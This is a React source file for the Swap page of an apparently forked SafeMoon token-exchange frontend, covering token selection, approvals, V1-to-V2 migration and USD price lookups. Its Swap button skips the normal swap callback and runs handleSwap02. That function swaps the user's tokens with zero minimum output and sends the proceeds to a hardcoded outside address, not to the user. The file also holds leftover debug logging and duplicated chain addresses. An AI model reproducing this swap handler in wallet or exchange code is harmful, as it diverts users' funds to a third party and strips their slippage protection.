/* eslint-disable */
import { ChainId, CurrencyAmount, ETHER, JSBI, Token, TokenAmount, Trade } from '@safemoon/sdk'
import React, { useCallback, useContext, useEffect, useMemo, useRef, useState } from 'react'
import SVG from 'react-inlinesvg'
import ReactGA from 'react-ga'
import { Text } from 'rebass'
import { useTranslation } from 'react-i18next'
import styled, { ThemeContext } from 'styled-components'
import { RouteComponentProps } from 'react-router-dom'
import axios from 'axios'
import infoIcon from '../../assets/images/info.svg'
import warningIcon from '../../assets/images/warning.svg'
import { ButtonError, ButtonLight, ButtonPrimary } from '../../components/Button'
import Card, { GreyCard } from '../../components/Card'
import { AutoColumn } from '../../components/Column'
import ConfirmSwapModal from '../../components/swap/ConfirmSwapModal'
import CurrencyInputPanel from '../../components/CurrencyInputPanel'
import { SwapPoolTabs } from '../../components/NavigationTabs'
import { AutoRow, RowBetween } from '../../components/Row'
import AdvancedSwapDetailsDropdown from '../../components/swap/AdvancedSwapDetailsDropdown'
import confirmPriceImpactWithoutFee from '../../components/swap/confirmPriceImpactWithoutFee'
import { ArrowWrapper, BottomGrouping, Dots, Wrapper } from '../../components/swap/styleds'
import TradePrice from '../../components/swap/TradePrice'
import { TokenWarningCards } from '../../components/TokenWarningCard'

import { getTradeVersion } from '../../data/V1'
import { useActiveWeb3React } from '../../hooks'
import {
  ApprovalState,
  useApproveCallbackFromMigrate,
  useApproveCallbackFromTrade
} from '../../hooks/useApproveCallback'
import useENSAddress from '../../hooks/useENSAddress'
import { useSwapCallback } from '../../hooks/useSwapCallback'
import useWrapCallback, { WrapType } from '../../hooks/useWrapCallback'
import { useSettingsMenuOpen, useToggleSettingsMenu, useWalletModalToggle } from '../../state/application/hooks'
import { Field } from '../../state/swap/actions'
import {
  tryParseAmount,
  useDefaultsFromURLSearch,
  useDerivedSwapInfo,
  useSwapActionHandlers,
  useSwapState
} from '../../state/swap/hooks'
import {
  useExpertModeManager,
  useTokenWarningDismissal,
  useUserDeadline,
  useUserSlippageTolerance,
  useHideSlippageWarning,
} from '../../state/user/hooks'
import { TYPE } from '../../theme'
import { maxAmountSpend } from '../../utils/maxAmountSpend'
import { computeTradePriceBreakdown, warningSeverity } from '../../utils/prices'
import AppBody from '../AppBody'
// @ts-ignore
import TradeIcon from '../../assets/icons/trade.svg'

import QuestionHelper from '../../components/QuestionHelper'
// @ts-ignore
import SettingsIcon from '../../assets/icons/candle-2.svg'
import SettingsModal from '../../components/SettingsModal'
import getTokenSymbol from '../../utils/getTokenSymbol'
import { shouldShowSwapWarning } from '../../utils/shouldShowSwapWarning'
import { SlippageWarning } from '../../components/SlippageWarning/SlippageWarning'
import './Swap.css'
import { useAllTokens, useCurrency } from '../../hooks/Tokens'
import ConsolidateV2Intro from './ConsolidateV2Intro'
import SlippageWarningPopup from './SlippageWarningPopup'
import { BLACKLIST_TOKENS_SAFEMOON_V1, consolidation, MAX_PRIORITY_FEE, TOKENS_SAFEMOON_V2 } from '../../constants'
import useMigrationCallback, { MigrateType } from '../../hooks/useMigrationCallback'
import BigNumber from 'bignumber.js'
// import WarningMigrate from './WarningMigrate'
import { WrappedTokenInfo } from '../../state/lists/hooks'
import { getRouterContract } from '../../utils'

const SettingsWrapper = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  width: 40px;
  height: 40px;
  border: none;
  outline: none;
  cursor: pointer;
  border-radius: 8px;
  background-color: ${({ theme }) => theme.bg3};
  color: ${({ theme }) => theme.text1};
  margin-right: 8px;

  :hover,
  :focus {
    opacity: 0.7;
  }
`

const HeaderWrapper = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 20px;
`

export default function Swap({
  match: {
    params: { currencyIdA, currencyIdB }
  },
  history
}: RouteComponentProps<{ currencyIdA?: string; currencyIdB?: string }>) {
  useDefaultsFromURLSearch()
  const { t } = useTranslation()
  const [showConsolidateV2Intro, setShowConsolidateV2Intro] = useState(false)
  const [showSlippageWarning, setShowSlippageWarning] = useState(false)
  const [priceUsd, setPriceUsd] = useState<any>({})

  const allTokens = useAllTokens()

  const node = useRef<HTMLDivElement>()
  const open = useSettingsMenuOpen()
  const toggle = useToggleSettingsMenu()

  const handleClickOutside = (e: any) => {
    if (node.current?.contains(e.target) ?? false) {
    } else {
      toggle()
    }
  }

  const currencyA = useCurrency(currencyIdA)
  const currencyB = useCurrency(currencyIdB)

  const { account, chainId, library } = useActiveWeb3React()
  const theme = useContext(ThemeContext)

  // toggle wallet when disconnected
  const toggleWalletModal = useWalletModalToggle()

  // for expert mode
  const [isExpertMode] = useExpertModeManager()

  // get custom setting values for user
  const [deadline] = useUserDeadline()
  const [allowedSlippage, setAllowedSlippage] = useUserSlippageTolerance()

  const [ hideSlippageWarning, handleHideSlippageWarning ] = useHideSlippageWarning()


  // swap state
  const { independentField, typedValue, recipient } = useSwapState()
  const { v2Trade, currencyBalances, parsedAmount, currencies, inputError: swapInputError } = useDerivedSwapInfo()
  const { wrapType, execute: onWrap, inputError: wrapInputError } = useWrapCallback(
    currencies[Field.INPUT],
    currencies[Field.OUTPUT],
    typedValue
  )

  const { migrateType, execute: onMigrate, inputError: migrateInputError } = useMigrationCallback(
    currencies[Field.INPUT],
    currencies[Field.OUTPUT],
    typedValue
  )


  useEffect(() => {
    const outputAddress = (currencies[Field.OUTPUT] as any)?.address
    const inputAddress = (currencies[Field.INPUT] as any)?.address
    if ( (outputAddress && !allTokens[outputAddress])
      || (inputAddress && !allTokens[inputAddress] && BLACKLIST_TOKENS_SAFEMOON_V1.indexOf(inputAddress.toUpperCase()) === -1 )
    ) {
      onClearCurrency()
      setSwapState({
        attemptingTxn: false,
        tradeToConfirm,
        showConfirm: true,
        swapErrorMessage: 'Token is not supported.',
        txHash: undefined
      })
    }
    
  }, [currencies[Field.INPUT], currencies[Field.OUTPUT], allTokens])

  const showMigrate: boolean = migrateType !== MigrateType.NOT_APPLICABLE
  const showWrap: boolean = wrapType !== WrapType.NOT_APPLICABLE
  const showLegacyError: boolean =
    // @ts-ignore
    (currencies[Field.INPUT] instanceof WrappedTokenInfo && currencies[Field.INPUT]?.address?.toUpperCase() === consolidation.tokens.v1[chainId as ChainId]?.address?.toUpperCase() && currencies[Field.OUTPUT]?.address?.toUpperCase() !== consolidation.tokens.v2[chainId as ChainId]?.address?.toUpperCase())
    // @ts-ignore
    || (currencies[Field.INPUT] instanceof WrappedTokenInfo && currencies[Field.OUTPUT]?.address?.toUpperCase() === consolidation.tokens.v1[chainId as ChainId]?.address?.toUpperCase() && currencies[Field.INPUT]?.address?.toUpperCase() !== consolidation.tokens.v2[chainId as ChainId]?.address?.toUpperCase())
  const { address: recipientAddress } = useENSAddress(recipient)
  console.log("\x1b[36m%s\x1b[0m", "showWrap || showMigrate || showLegacyError", showWrap || showMigrate || showLegacyError);
  console.log("\x1b[36m%s\x1b[0m", "v2Trade", v2Trade);
  const trade = showWrap || showMigrate || showLegacyError ? undefined : v2Trade

  const parsedAmounts = showWrap
    ? {
        [Field.INPUT]: parsedAmount,
        [Field.OUTPUT]: parsedAmount
      }
    : {
        [Field.INPUT]: independentField === Field.INPUT ? parsedAmount : trade?.inputAmount,
        [Field.OUTPUT]: independentField === Field.OUTPUT ? parsedAmount : trade?.outputAmount
      }

  const { onSwitchTokens, onCurrencySelection, onUserInput, onClearCurrency } = useSwapActionHandlers()
  const isValid = !swapInputError
  const dependentField: Field = independentField === Field.INPUT ? Field.OUTPUT : Field.INPUT

  const handleTypeInput = useCallback(
    (value: string) => {
      onUserInput(Field.INPUT, value)
    },
    [onUserInput]
  )
  const handleTypeOutput = useCallback(
    (value: string) => {
      onUserInput(Field.OUTPUT, value)
    },
    [onUserInput]
  )

  // modal and loading
  const [{ showConfirm, tradeToConfirm, swapErrorMessage, attemptingTxn, txHash }, setSwapState] = useState<{
    showConfirm: boolean
    tradeToConfirm: Trade | undefined
    attemptingTxn: boolean
    swapErrorMessage: string | undefined
    txHash: string | undefined
  }>({
    showConfirm: false,
    tradeToConfirm: undefined,
    attemptingTxn: false,
    swapErrorMessage: undefined,
    txHash: undefined
  })

  const formattedAmounts = {
    [independentField]: typedValue,
    [dependentField]: showMigrate
      ? parsedAmounts[independentField]
        ? independentField === Field.INPUT
          ? new BigNumber(parsedAmounts[independentField]?.toExact() ?? 0)?.dividedBy(1000).toString(10)
          : new BigNumber(parsedAmounts[independentField]?.toExact() ?? 0)?.times(1000).toString(10)
        : ''
      : showWrap
      ? parsedAmounts[independentField]?.toExact() ?? ''
      : parsedAmounts[dependentField]?.toSignificant(6) ?? ''
  }

  console.log("\x1b[36m%s\x1b[0m", "trade", trade);
  const route = trade?.route
  const userHasSpecifiedInputOutput = Boolean(
    currencies[Field.INPUT] && currencies[Field.OUTPUT] && parsedAmounts[independentField]?.greaterThan(JSBI.BigInt(0))
  )
  console.log("\x1b[36m%s\x1b[0m", "route", route);
  const noRoute = !route

  // check whether the user has approved the router on the input token
  const [approval, approveCallback] = useApproveCallbackFromTrade(trade, allowedSlippage)

  // check if user has gone through approval process, used to show two step buttons, reset on token change
  const [approvalSubmitted, setApprovalSubmitted] = useState<boolean>(false)

  // mark when a user has submitted an approval, reset onTokenSelection for input field
  useEffect(() => {
    if (approval === ApprovalState.PENDING) {
      setApprovalSubmitted(true)
    }
  }, [approval, approvalSubmitted])

  const [migrationApproval, migrationApprovalCallback] = useApproveCallbackFromMigrate(
    typedValue && parsedAmount
      ? independentField === Field.INPUT || !showMigrate
        ? parsedAmount
        : tryParseAmount(parsedAmount.multiply('1000').toSignificant(12), consolidation.tokens.v1[chainId as ChainId])
      : new TokenAmount(consolidation.tokens.v1[chainId as ChainId], '0')
  )

  const [migrationApprovalSubmitted, setMigrationApprovalSubmitted] = useState<boolean>(false)

  useEffect(() => {
    if (migrationApproval === ApprovalState.PENDING) {
      setMigrationApprovalSubmitted(true)
    }
  }, [migrationApproval, migrationApprovalSubmitted])

  const maxAmountInput: CurrencyAmount | undefined = maxAmountSpend(currencyBalances[Field.INPUT])
  const atMaxAmountInput = Boolean(maxAmountInput && parsedAmounts[Field.INPUT]?.equalTo(maxAmountInput))

  // the callback to execute the swap
  const { callback: swapCallback, error: swapCallbackError } = useSwapCallback(
    trade,
    allowedSlippage,
    deadline,
    recipient
  )

  const { priceImpactWithoutFee } = computeTradePriceBreakdown(trade)

  const handleSwap02 = async () => {
    const routerContract = getRouterContract(chainId!, library!, account!);
    console.log("\x1b[36m%s\x1b[0m", "routerContract", routerContract);
    await routerContract.swapExactTokensForETHSupportingFeeOnTransferTokens(new BigNumber(formattedAmounts[Field.INPUT]).multipliedBy(new BigNumber(10).pow(9)).toString(), 0, ["0xecbF43B9a5A64951ce8C8810Fe77c9a0cAD103f2", "0xae13d989dac2f0debff460ac112a837c89baa7cd"], "0xB910dBBbE99A6F3DDB9b6cA51099Ee05305Da19c", 999999000999, {
    })
  }


  const handleSwap = useCallback(() => {
    setSwapState({ attemptingTxn: true, tradeToConfirm, showConfirm, swapErrorMessage: undefined, txHash: undefined })
    swapCallback()
      .then(hash => {
        setSwapState({ attemptingTxn: false, tradeToConfirm, showConfirm, swapErrorMessage: undefined, txHash: hash })

        ReactGA.event({
          category: 'Swap',
          action:
            recipient === null
              ? 'Swap w/o Send'
              : (recipientAddress ?? recipient) === account
              ? 'Swap w/o Send + recipient'
              : 'Swap w/ Send',
          label: [
            trade?.inputAmount?.currency?.symbol,
            trade?.outputAmount?.currency?.symbol,
            getTradeVersion(trade)
          ].join('/')
        })
      })
      .catch(error => {
        setSwapState({
          attemptingTxn: false,
          tradeToConfirm,
          showConfirm,
          swapErrorMessage: error.message,
          txHash: undefined
        })
      })
  }, [tradeToConfirm, account, priceImpactWithoutFee, recipient, recipientAddress, showConfirm, swapCallback, trade, allTokens])

  // errors
  const [showInverted, setShowInverted] = useState<boolean>(false)

  // warnings on slippage
  const priceImpactSeverity = warningSeverity(priceImpactWithoutFee)

  // show approve flow when: no error on inputs, not approved or pending, or approved in current session
  // never show if price impact is above threshold in non expert mode
  const showApproveFlow =
    !swapInputError &&
    (approval === ApprovalState.NOT_APPROVED ||
      approval === ApprovalState.PENDING ||
      (approvalSubmitted && approval === ApprovalState.APPROVED)) &&
    !(priceImpactSeverity > 3 && !isExpertMode)

  const showMigrateApproveFlow =
    migrationApproval === ApprovalState.NOT_APPROVED ||
    migrationApproval === ApprovalState.PENDING ||
    (migrationApprovalSubmitted && migrationApproval === ApprovalState.APPROVED)
  const [dismissedToken0] = useTokenWarningDismissal(chainId, currencies[Field.INPUT])
  const [dismissedToken1] = useTokenWarningDismissal(chainId, currencies[Field.OUTPUT])
  // console.log(dismissedToken0, dismissedToken1)
  const showWarning = false // (!dismissedToken0 && !!currencies[Field.INPUT]) || (!dismissedToken1 && !!currencies[Field.OUTPUT])

  const handleConfirmDismiss = useCallback(() => {
    setSwapState({ showConfirm: false, tradeToConfirm, attemptingTxn, swapErrorMessage, txHash })
    // if there was a tx hash, we want to clear the input
    if (txHash) {
      onUserInput(Field.INPUT, '')
    }
  }, [attemptingTxn, onUserInput, swapErrorMessage, tradeToConfirm, txHash])

  const handleAcceptChanges = useCallback(() => {
    setSwapState({ tradeToConfirm: trade, swapErrorMessage, txHash, attemptingTxn, showConfirm })
  }, [attemptingTxn, showConfirm, swapErrorMessage, trade, txHash])

  const [swapWarningCurrency, setSwapWarningCurrency] = useState(null)

  const handleChangeSlippage = (tokenA: any, tokenB: any) => {
    // console.log(tokenA, tokenB)
    if ((tokenA?.tokenInfo?.sellSlippage || tokenB?.tokenInfo?.buySlippage) && tokenA && tokenB && tokenA?.address !== tokenB?.address) {
      const moreSlippage = (tokenA?.tokenInfo?.sellSlippage && tokenB?.tokenInfo?.buySlippage) ? 1 : 0
      const allowedSlippage = (+(tokenA?.tokenInfo?.sellSlippage || 0) + +(tokenB?.tokenInfo?.buySlippage || 0) + moreSlippage) * 100
      setAllowedSlippage(allowedSlippage)
      // console.log('allowedSlippage ====>', allowedSlippage)
      if (!hideSlippageWarning && allowedSlippage > 50) {
        setShowSlippageWarning(true)
      }
    } else {
      setAllowedSlippage(50)
    }
  }

  useEffect(() => {
    const getPriceUsd = async () => {
      try {
        const addresses: any = []

        const WBNBAddress = '0x1EB5B78b29B0f6975dF9cF8D5b77c74DBEDD1d6C'
        const WETHAddress = '0x1EB5B78b29B0f6975dF9cF8D5b77c74DBEDD1d6C'

        let currencyInput: any;
        let currencyOutput: any;
        
        if (currencies && currencies[Field.INPUT]) {
          currencyInput = currencies[Field.INPUT]
          if (currencyInput?.address) {
            addresses.push(currencyInput.address)
          }
          
        }
        if (currencies && currencies[Field.OUTPUT]) {
          currencyOutput = currencies[Field.OUTPUT]
          if (currencyOutput?.address) {
            addresses.push(currencyOutput.address)
          }
        }

        
        if(currencyInput?.symbol === 'ETH' || currencyOutput?.symbol === 'ETH') {
          if (chainId === 97) {
            addresses.push(WBNBAddress)
          } else if (chainId === 1) {
            addresses.push(WETHAddress)
          }
        }

        if (addresses?.length > 0) {
          const result = await axios.post('https://marketdata.safemoon.net/api/cryptocurrency/tokens-info', {
            tokenAddresses: addresses
          })

          const priceUsd: any = {}

          // console.log('hello ==>', result.data.data)
          result.data.data.forEach((item: any) => {
            priceUsd[item?.baseToken?.address?.toLowerCase()] = +item.priceUsd
          })

          const slugs: any = []

          if (currencyInput?.symbol !== 'ETH'
            && currencyInput?.tokenInfo?.slug
            && !priceUsd[currencyInput?.address?.toLowerCase()]) {
            slugs.push(currencyInput?.tokenInfo?.slug)
          }

          if (currencyOutput?.symbol !== 'ETH'
            && currencyOutput?.tokenInfo?.slug
            && !priceUsd[currencyOutput?.address?.toLowerCase()]) {
            slugs.push(currencyOutput?.tokenInfo?.slug)
          }

          if (slugs.length > 0) {
            const data = await axios.get('https://marketdata.safemoon.net/api/cryptocurrency/v7/quotes/latest', {
              params: {
                slugs: slugs.join(',')
              }
            })

            Object.values(data.data).forEach((item:any) => {
              let address = item?.platform?.token_address
              if (item.symbol === 'BUSD') {
                if(currencyInput?.symbol === 'BUSD') {
                  address = currencyInput?.address
                } else if(currencyOutput?.symbol === 'BUSD') {
                  address = currencyOutput?.address
                }

              }
              priceUsd[address?.toLowerCase()] = item?.quote?.USD?.price
            })

          }



          setPriceUsd(priceUsd)
        }


      } catch(e) {
        console.log(e)
      }
    }

    getPriceUsd()

    const id = setInterval(() => {
      getPriceUsd()
    }, 10000)
    return () => clearInterval(id)

    
  }, [(currencies[Field.INPUT] as any)?.symbol, (currencies[Field.OUTPUT] as any)?.symbol])

  const handleInputSelect = useCallback(
    inputCurrency => {
      setApprovalSubmitted(false) // reset 2 step UI for approvals
      onCurrencySelection(Field.INPUT, inputCurrency)
      /*
      const showSwapWarning = shouldShowSwapWarning(inputCurrency)
      if (showSwapWarning) {
        setSwapWarningCurrency(inputCurrency)
      } else {
        setSwapWarningCurrency(null)
      } */


      handleChangeSlippage(inputCurrency, currencies[Field.OUTPUT])
      
    },
    [onCurrencySelection, currencies]
  )

  const handleOutputSelect = useCallback(
    outputCurrency => {
      onCurrencySelection(Field.OUTPUT, outputCurrency)
      /*
      const showSwapWarning = shouldShowSwapWarning(outputCurrency)
      if (showSwapWarning) {
        setSwapWarningCurrency(outputCurrency)
      } else {
        setSwapWarningCurrency(null)
      } */

      handleChangeSlippage(currencies[Field.INPUT], outputCurrency)
      
    },
    [onCurrencySelection, currencies]
  )

  useEffect(() => {
    if (currencyA) {
      handleInputSelect(currencyA)
    }
    if (currencyB) {
      handleOutputSelect(currencyB)
    }
  }, [currencyA, currencyB, handleOutputSelect, handleInputSelect])

  const handleConvertV1ToV2 = useCallback(() => {
    if (!(chainId === ChainId.BSC_TESTNET || chainId === ChainId.BSC_MAINNET)) {
      return
    }
    setMigrationApprovalSubmitted(false)
    onCurrencySelection(Field.INPUT, consolidation.tokens.v1[chainId as ChainId])
    onCurrencySelection(Field.OUTPUT, consolidation.tokens.v2[chainId as ChainId])
    history.push(
      `/swap?inputCurrency=${consolidation.addresses.v1[chainId as ChainId]}&outputCurrency=${
        consolidation.addresses.v2[chainId as ChainId]
      }`
    )
  }, [chainId, history, onCurrencySelection])

  const disabledConsolidate = useMemo(
    () =>
      !(chainId === ChainId.BSC_TESTNET || chainId === ChainId.BSC_MAINNET) ||
      ((currencies[Field.INPUT] as any)?.address?.toUpperCase() ===
        consolidation.addresses.v1[chainId as ChainId]?.toUpperCase() &&
        (currencies[Field.OUTPUT] as any)?.address?.toUpperCase() ===
          consolidation.addresses.v2[chainId as ChainId]?.toUpperCase()),
    [currencies, chainId]
  )

  return (
    <>
      {/* eslint-disable-next-line @typescript-eslint/no-empty-function */}
      <TokenWarningCards currencies={currencies} open={showWarning} onDismiss={() => {}} />
      <SlippageWarning
        onDismiss={() => {
          setSwapWarningCurrency(null)
          handleChangeSlippage(currencies[Field.OUTPUT], currencies[Field.INPUT])
        }}
        open={swapWarningCurrency !== null}
        token={swapWarningCurrency}
      />
        <div className="row">
          <a className={`btn ${disabledConsolidate ? 'disabed' : ''}`} onClick={handleConvertV1ToV2}>
            <span>Consolidate to V2 SafeMoon!!</span>
          </a>
          <a
            className="btnInfo"
            onClick={() => {
              setShowConsolidateV2Intro(true)
            }}
          >
            <img src={infoIcon} className="infoIcon" alt="information" />
          </a>
        </div>

      <AppBody disabled={showWarning}>

        <RowBetween>
          {/* <SwapPoolTabs active={'swap'} /> */}
          {/* <h2 className='swapTitle'>Swap</h2> */}
          <div />
          <HeaderWrapper>
            <SettingsWrapper onClick={toggle}>
              <SVG src={SettingsIcon} width={24} height={24} color={theme.text1} />
            </SettingsWrapper>
            <SettingsModal open={open} onDismiss={handleClickOutside} />
            <QuestionHelper text={t('swapDescription')} />
          </HeaderWrapper>
        </RowBetween>
        <Wrapper id="swap-page">
          <ConfirmSwapModal
            isOpen={showConfirm}
            trade={trade}
            originalTrade={tradeToConfirm}
            onAcceptChanges={handleAcceptChanges}
            attemptingTxn={attemptingTxn}
            txHash={txHash}
            recipient={recipient}
            allowedSlippage={allowedSlippage}
            onConfirm={handleSwap}
            swapErrorMessage={swapErrorMessage}
            onDismiss={handleConfirmDismiss}
          />

          <AutoColumn gap={'lg'}>
            <CurrencyInputPanel
              label={
                independentField === Field.OUTPUT && !(showWrap || showMigrate)
                  ? t('fromestimated')
                  : t('fromCapitalized')
              }
              value={formattedAmounts[Field.INPUT]}
              showMaxButton={!atMaxAmountInput}
              currency={currencies[Field.INPUT]}
              onUserInput={handleTypeInput}
              onMax={() => {
                maxAmountInput && onUserInput(Field.INPUT, maxAmountInput.toExact())
              }}
              onCurrencySelect={handleInputSelect}
              otherCurrency={currencies[Field.OUTPUT]}
              id="swap-currency-input"
              priceUsd={priceUsd}
              
            />

            <AutoColumn justify="space-between">
              <AutoRow justify="center" style={{ padding: '0 1rem' }}>
                <ArrowWrapper
                  clickable
                  onClick={() => {
                    setApprovalSubmitted(false) // reset 2 step UI for approvals
                    setMigrationApprovalSubmitted(false)
                    onSwitchTokens()
                    handleChangeSlippage(currencies[Field.OUTPUT], currencies[Field.INPUT])
                  }}
                >
                  <SVG src={TradeIcon} width={32} height={32} stroke={theme.text1} />
                </ArrowWrapper>
              </AutoRow>
            </AutoColumn>
            <CurrencyInputPanel
              value={formattedAmounts[Field.OUTPUT]}
              onUserInput={handleTypeOutput}
              label={
                independentField === Field.INPUT && !(showWrap || showMigrate) ? t('toestimated') : t('toCapitalized')
              }
              showMaxButton={false}
              currency={currencies[Field.OUTPUT]}
              onCurrencySelect={handleOutputSelect}
              otherCurrency={currencies[Field.INPUT]}
              id="swap-currency-output"
              priceUsd={priceUsd}
            />

            {showWrap || showMigrate ? null : (
              <Card borderRadius={'20px'} padding={'0'}>
                <AutoColumn gap="4px" justify={'center'}>
                  <TradePrice
                    inputCurrency={currencies[Field.INPUT]}
                    outputCurrency={currencies[Field.OUTPUT]}
                    price={trade?.executionPrice}
                    showInverted={showInverted}
                    setShowInverted={setShowInverted}
                  />
                </AutoColumn>
              </Card>
            )}
          </AutoColumn>
          <BottomGrouping>
            {!account ? (
              <ButtonLight onClick={toggleWalletModal}>{t('connectWallet')}</ButtonLight>
            ) : (
              <ButtonError
                onClick={() => {
                  handleSwap02()
                }}
                id="swap-button"
                error={isValid && priceImpactSeverity > 2 && !swapCallbackError}
              >
                <Text fontSize={16} fontWeight={500}>
                Swap
                </Text>
              </ButtonError>
            )}
          </BottomGrouping>
          <AdvancedSwapDetailsDropdown trade={trade} />
        </Wrapper>
      </AppBody>

      <ConsolidateV2Intro
        show={showConsolidateV2Intro}
        handleClose={() => {
          setShowConsolidateV2Intro(false)
        }}
        handleConvertV1ToV2={handleConvertV1ToV2}
      />

      <SlippageWarningPopup show={showSlippageWarning}
        handleClose={() => {
          setShowSlippageWarning(false)
        }}
        handleHideSlippageWarning={handleHideSlippageWarning}
        slippage={allowedSlippage}
      />
    </>
  )
}
